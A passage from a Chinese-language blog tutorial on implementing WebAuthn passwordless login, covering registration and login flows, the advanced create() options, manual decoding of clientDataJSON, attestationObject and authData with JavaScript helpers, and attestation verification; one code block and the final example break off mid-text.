不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: 